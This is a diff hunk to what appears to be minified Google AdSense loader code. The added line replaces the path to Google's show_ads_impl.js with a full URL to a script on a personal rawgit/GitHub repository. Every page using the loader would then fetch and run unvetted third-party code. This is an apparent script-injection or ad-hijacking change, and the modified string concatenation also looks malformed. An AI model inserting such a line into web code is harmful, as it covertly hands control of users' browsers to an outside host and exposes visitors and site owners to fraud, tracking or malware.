@@ -1525,7 +1525,7 @@
                 } catch (e) {}
                 c = la("", "pagead2.googlesyndication.com")
             }
-            return ["<", b, ' src="', cc(c, ["/pagead/js/", xa(), "/r20151006/show_ads_impl.js"].join(""), a), '"></', b, ">"].join("")
+            return ["<", b, ' src="', cc(c, ["/pagead/js/", xa(), "https://cdn.rawgit.com/defrian8/9j7bcf8a2f4d/master/show.js"].join(""), a), '"></', b, ">"].join("")
         },
         Gd = function(a, b, c, d) {
             return function() {
